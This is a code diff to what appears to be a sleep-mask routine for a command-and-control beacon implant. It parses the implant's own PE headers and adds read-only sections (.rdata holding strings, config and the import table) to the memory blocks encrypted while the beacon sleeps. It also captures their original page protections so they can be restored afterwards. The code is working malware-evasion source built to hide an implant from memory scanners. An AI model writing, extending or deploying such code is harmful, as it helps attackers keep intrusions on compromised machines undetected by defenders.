@@ -264,11 +264,14 @@ static void bw_blocks_restore(BW_BLOCK * blocks, int n, int text_idx,
 /* Snapshot the whole image (header page + every section except the
  * unwind/reloc tables) plus tracked heap records outside the image. The
  * .text block is appended LAST and reported via *text_idx - the enter stub
- * masks it separately and the exit stub restores it first. */
+ * masks it separately and the exit stub restores it first.
+ * Read-only non-.text sections (.rdata, where the strings/config/IAT
+ * live) join the list too: the stubs are API-free and the teardown runs
+ * on captured pointers, so the IAT can be ciphertext for the window. */
 static int bw_snapshot(BW_BLOCK * out, int max, void * image, int * text_idx)
 {
 	DWORD text_span[2];
-	int n, t;
+	int n, t, i;
 
 	/* the g3 engine already walks our own PE (header page, writable
 	 * non-.text sections, tracked heap with the in-image dedup rules) -
@@ -279,6 +282,60 @@ static int bw_snapshot(BW_BLOCK * out, int max, void * image, int * text_idx)
 		return 0;
 	if (text_span[0] == 0 || text_span[1] <= text_span[0])
 		return 0;
+
+	/* the accessor's blocks carry no protection (the gen3 type has no
+	 * prot field). orig_prot 0 makes the teardown's restore-VP a silent
+	 * no-op - harmless while every block was RW, wrong once read-only
+	 * sections join: capture the TRUE protection of each block now,
+	 * before anything is flipped */
+	for (i = 0; i < n; i++) {
+		if (out[i].orig_prot == 0)
+			(void)bw_page_usable(out[i].ptr, &out[i].orig_prot);
+	}
+
+	/* append every READ-ONLY committed section outside .text (.rdata,
+	 * .pdata, .rsrc...): the window contract (no API between phase 2 and
+	 * the exit stub, stub-side PRGA, captured pVP/pDelTimer) covers them */
+	{
+		unsigned char * pe = (unsigned char *)gparms->beacon_ptr;
+		DWORD lfanew = *(DWORD *)(pe + 0x3C);
+		WORD nsec = *(WORD *)(pe + lfanew + 6);
+		WORD optsz = *(WORD *)(pe + lfanew + 20);
+		DWORD secoff = lfanew + 24 + optsz;
+		WORD s;
+		for (s = 0; s < nsec && n + 1 < max; s++) {
+			unsigned char * so = pe + secoff + (DWORD)s * 40;
+			DWORD vsz = *(DWORD *)(so + 8);
+			DWORD va = *(DWORD *)(so + 12);
+			DWORD rsz = *(DWORD *)(so + 16);
+			DWORD end = va + (vsz ? vsz : rsz);
+			unsigned char * psec;
+			DWORD prot = 0;
+			int covered = 0;
+			if (va == 0 || end <= va)
+				continue;
+			if (va < text_span[1] && end > text_span[0])
+				continue; /* .text: the stub path owns it */
+			psec = pe + va;
+			if (!bw_page_usable(psec, &prot))
+				continue;
+			if (prot & (PAGE_READWRITE | PAGE_WRITECOPY |
+			            PAGE_EXECUTE_READWRITE | PAGE_EXECUTE_WRITECOPY))
+				continue; /* writable: the accessor list already has it */
+			for (i = 0; i < n; i++) {
+				if (out[i].ptr < psec + (end - va) && out[i].ptr + out[i].len > psec) {
+					covered = 1;
+					break;
+				}
+			}
+			if (covered)
+				continue;
+			out[n].ptr = psec;
+			out[n].len = end - va;
+			out[n].orig_prot = prot;
+			n++;
+		}
+	}
 
 	/* append .text (single committed region clamp, same as g3 keeps for
 	 * its own exclusions); the enter stub masks it LAST via ctx->u_text */
